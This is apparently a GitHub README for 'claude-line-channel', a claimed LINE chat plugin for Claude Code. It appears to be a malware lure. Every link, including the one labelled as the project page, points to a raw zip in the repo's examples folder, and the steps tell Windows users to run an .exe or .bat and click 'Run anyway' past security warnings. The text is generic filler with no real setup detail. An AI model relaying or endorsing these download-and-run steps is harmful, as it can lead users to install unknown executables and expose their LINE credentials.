# 🤖 claude-line-channel - Connect Claude to LINE Chats

[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge&logo=github)](https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip)

## 📥 Download

Visit this page to download and run the app on Windows:

https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip

## 🖥️ What This App Does

claude-line-channel is a LINE Messaging API channel plugin for Claude Code.

It helps you connect Claude to LINE so you can send and receive chat messages in one place. This makes it easier to use Claude in a chat flow that feels close to a normal LINE conversation.

Use it if you want:

- LINE chat support for Claude Code
- a simple channel setup for chatbot use
- a local Windows run path for testing
- a plugin-based setup that fits Claude Code work

## ✅ Before You Start

You need:

- A Windows PC
- A web browser
- Internet access
- A LINE account
- Access to the GitHub page above

For a smooth setup, have these ready too:

- Your LINE channel ID
- Your LINE channel secret
- Your LINE access token
- A place where you can copy and paste text

## 🚀 Getting Started

Follow these steps on Windows:

1. Open this page in your browser:
   https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip

2. Look for the download files on the page.

3. Download the app or package that matches your Windows setup.

4. If the file is a `.zip`, right-click it and choose **Extract All**.

5. Open the extracted folder.

6. Look for a file such as:
   - `claude-line-channel.exe`
   - `run.bat`
   - `start.bat`

7. Double-click the file to start the app.

8. If Windows asks for permission, choose **Run anyway** or **More info > Run anyway** if you trust the source.

9. Keep the window open while you use the channel.

## ⚙️ First-Time Setup

After you start the app, you may need to connect it to LINE and Claude Code.

Use the values from your LINE developer settings:

- Channel ID
- Channel secret
- Access token

If the app shows a setup file, edit it with Notepad.

Common setup file names:

- `.env`
- `config.json`
- `settings.json`

Add the values you received from LINE, then save the file.

If the app asks for a webhook URL, copy it into your LINE channel settings.

## 📲 How to Use It

Once the app runs, it works as a bridge between LINE and Claude Code.

Typical flow:

1. A user sends a message in LINE.
2. The channel plugin receives the message.
3. Claude Code processes the message.
4. The reply goes back to LINE.

This setup works well for:

- simple chatbot replies
- test chats
- message automation
- LINE-based assistant use

## 🧩 Key Parts

This repo focuses on three main parts:

- **Channel plugin**: connects the app to Claude Code
- **LINE Messaging API**: handles LINE messages
- **Chatbot flow**: sends replies back to users

## 🔧 Common Windows Setup Steps

If the app does not start right away, try these steps:

- Make sure the file finished downloading
- Extract all files from the ZIP
- Run the app from the extracted folder
- Check that your LINE keys are pasted in full
- Close other apps that may use the same port
- Start the app again after you save the config file

If you use PowerShell or Command Prompt, open the app from the folder where the files live.

## 🔒 LINE Connection Setup

To link LINE with this plugin, you usually need to:

- Create or open a LINE Messaging API channel
- Copy your channel ID
- Copy your channel secret
- Create a channel access token
- Set the webhook URL
- Turn on webhook use in LINE settings

If the app gives you a local address, use it in your LINE developer console as the webhook target.

## 🧪 Test Your Setup

After setup, send a test message from LINE.

Check for these signs:

- the app window shows activity
- the message reaches Claude Code
- a reply comes back in LINE

If the reply does not show up:

- check your token
- check your channel secret
- check your webhook address
- restart the app
- try again with a new test message

## 📁 Suggested Folder Layout

You may see files like these after download:

- `README.md`
- `package.json`
- `src`
- `dist`
- `config`
- `example.env`

If the repo includes a sample config file, copy it and rename it before editing.

## 🛠️ Useful Troubleshooting Tips

If Windows blocks the file:

- Right-click the file
- Open **Properties**
- Look for **Unblock**
- Apply the change if you see it

If the app closes right away:

- open the app from Command Prompt
- read the error text
- check if a missing config value caused the stop

If LINE does not reply:

- confirm webhook use is on
- confirm the app is running
- confirm the token is current
- confirm the channel secret matches the LINE channel

If messages are delayed:

- check your network
- reduce other heavy apps on your PC
- restart the channel plugin

## 🧭 What You Can Expect

This tool is meant for users who want a LINE-based chat channel for Claude Code.

It gives you a clear path to:

- download the project from GitHub
- run it on Windows
- connect LINE settings
- test chatbot replies
- keep the chat channel active for use

## 📝 GitHub Page

Open the project page here:

https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip